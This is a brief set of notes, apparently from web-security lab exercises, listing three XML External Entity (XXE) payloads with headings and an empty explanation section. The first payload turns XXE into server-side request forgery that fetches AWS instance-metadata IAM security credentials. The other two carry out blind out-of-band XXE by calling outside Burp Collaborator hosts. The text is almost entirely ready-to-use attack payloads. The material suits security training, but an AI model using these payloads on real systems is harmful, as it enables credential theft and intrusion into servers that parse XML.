
### Exploiting XXE to perform SSRF attacks
**Payload** : 
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck>
<productId>
&xxe;
</productId><storeId>3</storeId></stockCheck>
```

### Blind XXE with out-of-band interaction
**Payload** :
```xml
<?xml version="1.0" encoding="UTF-8"?>
			<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://o5u21yqajch2ke0bv6f8ojy5swynmda2.oastify.com"> ]>
<stockCheck>
	<productId>
		&xxe;
	</productId>
	<storeId>
		1
	</storeId>
</stockCheck>
```

### Blind XXE with out-of-band interaction via XML parameter entities
**Payload** :
```xml
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://dhyrdn2zv1trw3c07vrx08au4lacy3ms.oastify.com"> %xxe; ]>
	<stockCheck>
		<productId>
			&xxe;
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```
**Penjelasan** :
